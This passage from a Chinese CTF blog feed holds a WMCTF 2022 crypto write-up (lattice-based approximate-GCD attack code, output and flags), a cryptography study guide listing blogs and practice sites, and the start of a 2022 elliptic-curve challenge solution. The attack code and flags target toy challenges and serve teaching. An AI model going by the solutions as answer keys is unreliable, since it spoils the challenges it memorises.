class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(flag))</span><br><span class="line"><span class="comment"># b&#x27;$$U_c0u1d_s01v3_e11iptiCurv3_s0_34sily$$0f19d82199a0db0dee31fa12330307ea90aa&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>wmctf{$$U_c0u1d_s01v3_e11iptiCurv3_s0_34sily$$0f19d82199a0db0dee31fa12330307ea90aa}</p></blockquote><h3 id="homo"><a href="#homo" class="headerlink" title="homo"></a>homo</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><ul><li><p>gentry.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;wmctf&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flaglen = <span class="built_in">len</span>(flag) - <span class="number">7</span></span><br><span class="line">flag = bytes_to_long(flag[<span class="number">6</span>:-<span class="number">1</span>])</span><br><span class="line">pbit = <span class="number">114</span></span><br><span class="line">qbit = <span class="number">514</span></span><br><span class="line">rbit = <span class="number">191</span></span><br><span class="line">keylen = <span class="number">981</span></span><br><span class="line">nouse = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    pk = []</span><br><span class="line">    sk = getPrime(qbit)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(keylen):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        p = getPrime(pbit)</span><br><span class="line">        r = getPrime(rbit)</span><br><span class="line">        pk.append(p * sk + <span class="number">2</span> * r)</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">m, pk</span>):</span></span><br><span class="line">    c = []</span><br><span class="line">    m = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bin</span>(m)[<span class="number">2</span>:]]  <span class="comment"># 转二进制</span></span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        tempc = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(keylen):</span><br><span class="line">            <span class="keyword">if</span> randint(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">                tempc += pk[j]</span><br><span class="line">        c.append(tempc)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pk, sk = keygen()</span><br><span class="line"><span class="built_in">print</span>(sk)</span><br><span class="line">c = enc(flag, pk)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./pubkey.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(pk))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./cipher.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c))</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>([(i % sk) % <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> c])</span><br><span class="line"><span class="built_in">print</span>(sk)</span><br></pre></td></tr></table></figure></li><li><p><a href="http://cun.harry0597.com/CTF/wmctf2022/homo/pubkey.txt">pubkey.txt</a></p></li><li><p><a href="http://cun.harry0597.com/CTF/wmctf2022/homo/cipher.txt">cipher.txt</a></p></li></ul><h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>搜索思路</p><ul><li><p><a href="https://tover.xyz/p/wieners-lattices-equations/#What-about-a-iX-equiv-y-i-pmod-P-i-s-i">https://tover.xyz/p/wieners-lattices-equations/#What-about-a-iX-equiv-y-i-pmod-P-i-s-i</a> -&gt; 21wmctf lsb</p></li><li><p><a href="https://hackmd.io/@crazyman/BJXeu3abY#Easylsb">https://hackmd.io/@crazyman/BJXeu3abY#Easylsb</a> -&gt; <a href="https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/">https://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/</a> -&gt; <strong>AGCD</strong></p></li></ul><p>相关参考</p><ul><li><p>AGCD SDA attack code <a href="https://github.com/mathno1/Lattice/tree/main/AGCD">https://github.com/mathno1/Lattice/tree/main/AGCD</a></p></li><li><p>Paper <a href="https://eprint.iacr.org/2016/215.pdf">https://eprint.iacr.org/2016/215.pdf</a></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220823092900531.png" alt="image-20220823092900531"></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/0HB/Desktop/复现/wm/homo/pubkey.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">pk_ = f.read()</span><br><span class="line">x = []</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;x.extend(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(pk_))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/0HB/Desktop/复现/wm/homo/cipher.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">c_ = f.read()</span><br><span class="line">ct = []</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;ct.extend(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c_))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SDA</span>(<span class="params">x, t, gamma, rho, eta</span>):</span></span><br><span class="line">    M = Matrix(ZZ, t, t)</span><br><span class="line">    M[<span class="number">0</span>, <span class="number">0</span>] = <span class="number">2</span>^(rho+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        M[<span class="number">0</span>, i] = x[i]</span><br><span class="line">        M[i, i] = -x[<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Matirx done&#x27;</span>)</span><br><span class="line">    ML = M.LLL()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;LLL done!&#x27;</span>)</span><br><span class="line"><span class="comment">#     f = open(&#x27;/Users/0HB/Desktop/复现/wm/homo/LLL.txt&#x27;, &#x27;w&#x27;)</span></span><br><span class="line"><span class="comment">#     f.write(str(ML))</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     print(&#x27;Save LLL&#x27;)</span></span><br><span class="line"></span><br><span class="line">    d = ML.determinant()</span><br><span class="line"><span class="comment">#     assert d == 2^(rho + 1) * x[0]^(t - 1)</span></span><br><span class="line"><span class="comment">#     assert sqrt(t)*2^(gamma - eta + rho + 1) &lt; sqrt(t/(2*pi*e))*d^(1/t)</span></span><br><span class="line"></span><br><span class="line">    v = ML[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">min</span> = <span class="built_in">abs</span>(norm(ML[<span class="number">0</span>]) - sqrt(t)*<span class="number">2</span>^(gamma - eta + rho + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ML:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span> &gt; <span class="built_in">abs</span>(norm(i) - sqrt(t)*<span class="number">2</span>^(gamma - eta + rho + <span class="number">1</span>)):</span><br><span class="line">            <span class="built_in">min</span> = <span class="built_in">abs</span>(norm(i) - sqrt(t)*<span class="number">2</span>^(gamma - eta + rho + <span class="number">1</span>))</span><br><span class="line">            v = i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># v[0] = 2^(rho + 1) * q_0</span></span><br><span class="line">    q0 = v[<span class="number">0</span>] // <span class="number">2</span>^(rho + <span class="number">1</span>)</span><br><span class="line">    r0 = x[<span class="number">0</span>] % q0</span><br><span class="line">    <span class="built_in">print</span>(q0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, q0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;r =&#x27;</span>, r0)</span><br><span class="line">    p = (x[<span class="number">0</span>] - r0) // q0</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sk:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(p))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">ct, p</span>):</span></span><br><span class="line">    ct = <span class="string">&#x27;0b&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i%p%<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> ct)</span><br><span class="line">    m = <span class="built_in">int</span>(ct, <span class="number">2</span>).to_bytes((<span class="built_in">len</span>(ct) - <span class="number">1</span>) // <span class="number">8</span>, byteorder=<span class="string">&#x27;big&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    t = <span class="number">981</span></span><br><span class="line">    gamma = <span class="number">628</span>  <span class="comment"># 514+114</span></span><br><span class="line">    eta = <span class="number">514</span></span><br><span class="line">    rho = <span class="number">191</span></span><br><span class="line">    p = SDA(x, t, gamma, rho, eta)</span><br><span class="line">    <span class="built_in">print</span>(decryption(ct, p))</span><br></pre></td></tr></table></figure><p><strong>output</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Matirx</span> done</span><br><span class="line"><span class="attribute">LLL</span> done!</span><br><span class="line"><span class="attribute">17195743943555229331660961462727499</span></span><br><span class="line"><span class="attribute">p</span> = <span class="number">17195743943555229331660961462727499</span></span><br><span class="line"><span class="attribute">r</span> = <span class="number">2615830010834467677351383140406463</span></span><br><span class="line"><span class="attribute">sk</span>:<span class="number">41565572874253689464437825525802665878958533473562648432875965578230785556539072257838190060392315994424904212374664222250474284551897781086850148587327684</span></span><br></pre></td></tr></table></figure><p>r&gt;p，所以上面求得的r、sk是不准的，可以利用整除p平方（p平方大于2r）的思想消除r影响，求得真正的私钥sk</p><p><strong>get flag</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum, gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/0HB/Desktop/复现/wm/homo/pubkey.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">pk_ = f.read()</span><br><span class="line">pks = []</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;pks.extend(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(pk_))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/0HB/Desktop/复现/wm/homo/cipher.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">c_ = f.read()</span><br><span class="line">cs = []</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;cs.extend(&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(c_))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># c = p*sk+2*r</span></span><br><span class="line"><span class="string">c = 714750948012851406500586517157106717606895617539492838332982483584450804764237803294239970247209996859617533175677756145984683775979560835419919499626250456011382074927666818288229451188779</span></span><br><span class="line"><span class="string">p = 17195743943555229331660961462727499</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 不准</span></span><br><span class="line"><span class="string">r = 2615830010834467677351383140406463 # 2*r % p</span></span><br><span class="line"><span class="string">sk:41565572874253689464437825525802665878958533473562648432875965578230785556539072257838190060392315994424904212374664222250474284551897781086850148587327684</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">ct, p</span>):</span></span><br><span class="line">    ct = <span class="string">&#x27;0b&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(i % p % <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> ct)</span><br><span class="line">    m = <span class="built_in">int</span>(ct, <span class="number">2</span>).to_bytes((<span class="built_in">len</span>(ct) - <span class="number">1</span>) // <span class="number">8</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># x = p*sk+2*r</span></span><br><span class="line">x = pks[<span class="number">0</span>]</span><br><span class="line">p = <span class="number">17195743943555229331660961462727499</span></span><br><span class="line">r = <span class="number">2615830010834467677351383140406463</span></span><br><span class="line">sk0 = <span class="number">41565572874253689464437825525802665878958533473562648432875965578230785556539072257838190060392315994424904212374664222250474284551897781086850148587327684</span></span><br><span class="line"><span class="built_in">print</span>(decryption(cs, sk0))</span><br><span class="line">sk = ((x//(p**<span class="number">2</span>))*(p**<span class="number">2</span>))//p</span><br><span class="line"><span class="built_in">print</span>(decryption(cs, sk))</span><br><span class="line"><span class="comment"># b&#x27;sodayo&gt;A&lt;!!$%!$_Easy_G@CDp_ATtaCk&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>wmctf{sodayo&gt;A&lt;!!$%!$_Easy_G@CDp_ATtaCk}</p></blockquote><h3 id="INTERCEPT"><a href="#INTERCEPT" class="headerlink" title="INTERCEPT"></a>INTERCEPT</h3><p>人菜+时间不够了</p><h3 id="OCOCOCB"><a href="#OCOCOCB" class="headerlink" title="OCOCOCB"></a>OCOCOCB</h3><p>2021年</p><ul><li><a href="https://hackmd.io/@crazyman/BJXeu3abY#baby_ocb">https://hackmd.io/@crazyman/BJXeu3abY#baby_ocb</a></li><li><a href="https://zhuanlan.zhihu.com/p/405493136">https://zhuanlan.zhihu.com/p/405493136</a></li></ul><p>简单看了下往年wp，没思路就没看了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学习指南</title>
      <link href="/2022/08/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"/>
      <url>/2022/08/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="密码学习指南"><a href="#密码学习指南" class="headerlink" title="密码学习指南"></a>密码学习指南</h1><p>密码学习，是同时与数学和计算机打交道。<br>闭门造车只会孤陋寡闻，当从多处求经、求学。<br>多读、多试、多练！</p><h2 id="从0到1"><a href="#从0到1" class="headerlink" title="从0到1"></a>从0到1</h2><ul><li><a href="https://harry0597.com">首推，当然是我的博客😎</a><br>花些时间，把里面的RSA原理、简单题型内容都学过一遍，基本算入门了</li><li><a href="https://0xffff.one/d/769-ctf-cong-dao-1-zero2one/17">0xffff论坛密码指南</a><br>文章对密码学的知识体系进行简单梳理，类似学习大纲</li></ul><h2 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h2><p>上面给到的两个链接，让你已经大致了解到了CTF中密码需要学些什么<br>那么，具体该如何进展呢？<br>这里我给出自己觉得合理的<strong>学习路线</strong></p><ol start="0"><li><p>最好在学习完RSA原理后，<strong>建立个人博客</strong>，记录学习笔记</p></li><li><p>按照发文的时间顺序，在NEFU社区 or 我的博客里，把<a href="https://blog.csdn.net/qq_32284207/article/details/124771025">古典</a>极速过一遍（认识、积累代码、密码表，自己实现解法）</p></li><li><p>认认真真、扎扎实实地把RSA基础原理学了<br><a href="https://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">RSA算法原理（一）</a><br><a href="https://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html">RSA算法原理（二）</a></p></li><li><p><a href="https://cryptohack.org/challenges/rsa/">Cryptohack</a>初试RSA</p></li><li><p><a href="https://cryptohack.org/challenges/rsa/">BUUCTF</a> 刷题，不会的就搜wp，知道RSA的模版题有哪些</p></li><li><p>跟着<a href="https://www.bilibili.com/video/BV1Dw411f7Ht?spm_id_from=333.999.0.0">F2X师傅的RSA系列视频</a> ，扎扎实实打基础，过题型，懂原理<br><a href="http://ctf.nefu.edu.cn/bbs/d/120-crypto-rsa">RSA题型总结</a></p><p><strong>注意要好好理解、记录RSA学习过程过程中所学到的数学概念、算法</strong></p></li><li><p>可以跟着喜欢的师傅的博客学 / 跟着书学</p><p>可以选择，跟着（社区内/我的博客）密码相关帖子学习密码体系（分组密码、随机数、椭圆曲线···）</p></li><li><p>跟着<a href="https://lazzzaro.github.io">Lazzaro博客</a>系统的过一下CTF·Crypto</p></li><li><p>多打比赛，总结手法</p></li><li><p>通过论文，学习最新的密码攻击</p></li></ol><h2 id="从1到∞"><a href="#从1到∞" class="headerlink" title="从1到∞"></a>从1到∞</h2><p>好好利用互联网资源，从blog友链中找到合适的师傅，跟着博客学（友链套友链，学习资源无限🥳<br>以下分享些进阶的、高超的密码师傅博客</p><ul><li><a href="https://lazzzaro.github.io">https://lazzzaro.github.io</a><br>密码之神，密码手的信仰</li><li><a href="https://4xwi11.github.io">https://4xwi11.github.io</a><br>跟着4xwi11师傅从小学到大<br>文章通俗易懂，非常推荐！！！</li><li><a href="https://jayxv.github.io/2020/05/27/密码学学习笔记之introduction%20to%20mathematical%20cryptography/">https://jayxv.github.io/2020/05/27/密码学学习笔记之introduction%20to%20mathematical%20cryptography/</a><br>V神的入门指南，文章密码是Van1sh,，记得学习博客中其他博文！！！</li><li><a href="https://lordriot.live/2020/07/06/Way-to-Crypto/">https://lordriot.live/2020/07/06/Way-to-Crypto/</a><br>北邮密码师傅<br>觉得自己懂了不少了，可以再来看看这进阶版本的密码学习指南</li><li><a href="http://www.zimablue.life">http://www.zimablue.life</a><br>难度适宜，循序渐进，文章出彩！</li><li><a href="https://tl2cents.github.io">https://tl2cents.github.io</a><br>能学到不少东西，也更适合入门些</li><li><a href="https://tover.xyz">https://tover.xyz</a><br>华师密码研究生（好像），内容非常有深度</li><li><a href="https://blog.slight-wind.com">https://blog.slight-wind.com</a><br>厉害的密码手</li><li><a href="https://dawn-whisper.hack.best">https://dawn-whisper.hack.best</a><br>学习到格子时，此师傅的文章尤为关键</li><li><a href="https://badmonkey.site/tags/crypto">https://badmonkey.site/tags/crypto</a><br>MT19937一文讲的十分出彩</li><li><a href="https://introspelliam.github.io">https://introspelliam.github.io</a><br>博客、密码相关文章都很详细</li><li><a href="https://www.nairw.top">https://www.nairw.top</a><br>👍</li><li><a href="https://www.cnblogs.com/oyrd/">https://www.cnblogs.com/oyrd/</a><br>山东大学密码师傅🐮</li><li><a href="http://blog.tolinchan.xyz">http://blog.tolinchan.xyz</a><br>南邮密码师傅，👍</li><li><a href="https://tearsjin.github.io/archives/">https://tearsjin.github.io/archives/</a><br>跟着tearsjin师傅刷题吧！</li></ul><h2 id="常用练习平台"><a href="#常用练习平台" class="headerlink" title="常用练习平台"></a>常用练习平台</h2><ul><li><a href="http://ctf.nefu.edu.cn/ctf/challenges">NEFUCTF</a></li><li><a href="https://adworld.xctf.org.cn/task/task_list?type=crypto&number=5&grade=0">攻防世界密码入门</a></li><li><a href="https://buuoj.cn">buu</a></li><li><a href="https://www.ctfer.vip/index">NSSCTF</a></li><li><a href="https://cryptohack.org">CRYPTOHACK</a></li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;The_world_of_cryptography&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客2022·Crypto</title>
      <link href="/2022/08/18/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22022/"/>
      <url>/2022/08/18/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22022/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="point-power"><a href="#point-power" class="headerlink" title="point-power"></a>point-power</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">42</span></span><br><span class="line">p=getPrime(<span class="number">600</span>)</span><br><span class="line">a=bytes_to_long(flag)</span><br><span class="line">b=randrange(<span class="number">2</span>,p-<span class="number">1</span>)</span><br><span class="line">E=EllipticCurve(GF(p),[a,b])</span><br><span class="line">G=E.random_element()</span><br><span class="line"></span><br><span class="line">x1,y1,_=G</span><br><span class="line">G=<span class="number">2</span>*G</span><br><span class="line">x2,y2,_=G</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x1 = <span class="subst">&#123;x1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x2 = <span class="subst">&#123;x2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span></span><br><span class="line"><span class="string">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span></span><br><span class="line"><span class="string">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span></span><br><span class="line"><span class="string">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>回顾一下椭圆曲线上的加法</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Xr = <span class="comment">(λ² - Xp - Xq)</span> mod p　　</span><br><span class="line">Yr = <span class="comment">(λ(Xp - Xr)</span> - Yp) mod p　　</span><br><span class="line">λ = <span class="comment">(3Xp² + a)</span>/<span class="number">2</span>Yp mod p（若P=Q）</span><br></pre></td></tr></table></figure><p>可得：<br>$$<br>x_2=(\frac{3{x_1}^2+a}{2y_1})^2-x1-x1 \mod p<br>$$<br>又有曲线定义<br>$$<br>y^2=x^3+ax+b<br>$$<br>所以<br>$$<br>y_1^2=x_1^3+ax_1+b<br>$$<br>于是有<br>$$<br>x_2=\frac{(3{x_1}^2+a)^2}{4(x_1^3+ax_1+b)}-x_1-x_1 \mod p<br>$$</p><p>也即：<br>$$<br>4(x_1^3+ax_1+b)•x_2 =(3{x_1}^2+a)^2-2•x_1•4(x_1^3+ax_1+b) \mod p<br>$$<br>上式未知数只有a，构造f函数，sage求解a即解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 